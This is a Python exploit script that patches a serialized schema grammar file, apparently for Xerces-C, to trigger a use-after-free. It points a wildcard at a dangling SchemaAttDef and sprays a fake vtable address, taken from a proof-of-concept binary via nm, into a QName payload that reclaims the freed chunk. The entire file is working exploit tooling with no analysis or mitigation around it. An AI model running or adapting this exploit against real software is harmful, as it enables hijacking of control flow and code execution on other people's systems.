#!/usr/bin/env python3
import re
import struct
import subprocess
import sys
from pathlib import Path

if len(sys.argv) != 4:
    print(f"usage: {sys.argv[0]} <base-grammar.bin> <nonpie-poc> <out.bin>", file=sys.stderr)
    sys.exit(1)

base_path = Path(sys.argv[1])
poc_path = Path(sys.argv[2])
out_path = Path(sys.argv[3])

nm = subprocess.check_output(["nm", "-n", str(poc_path)], text=True)
match = re.search(r"^([0-9a-fA-F]+)\s+D\s+fake_vtable$", nm, re.M)
if not match:
    print("could not find fake_vtable in nm output", file=sys.stderr)
    sys.exit(1)

fake_vtable = int(match.group(1), 16)
data = bytearray(base_path.read_bytes())

old = "attr1111111".encode("utf-16le")
new = "attr0000000".encode("utf-16le")
rename_off = data.find(old)
if rename_off == -1:
    print("could not find attr1111111", file=sys.stderr)
    sys.exit(1)
data[rename_off:rename_off + len(new)] = new

# first element fAttWildCard -> dangling SchemaAttDef id 15
struct.pack_into("<I", data, 1404, 15)

needle = ("L" * 48).encode("utf-16le")
hits = []
start = 0
while True:
    hit = data.find(needle, start)
    if hit == -1:
        break
    hits.append(hit)
    start = hit + 1

if len(hits) < 2:
    print("could not find the long QName local part twice", file=sys.stderr)
    sys.exit(1)

# the second hit is the serialized QName.local payload that reclaims the freed SchemaAttDef chunk
qname_data_off = hits[1]
struct.pack_into("<Q", data, qname_data_off + 8, fake_vtable)

out_path.write_bytes(data)
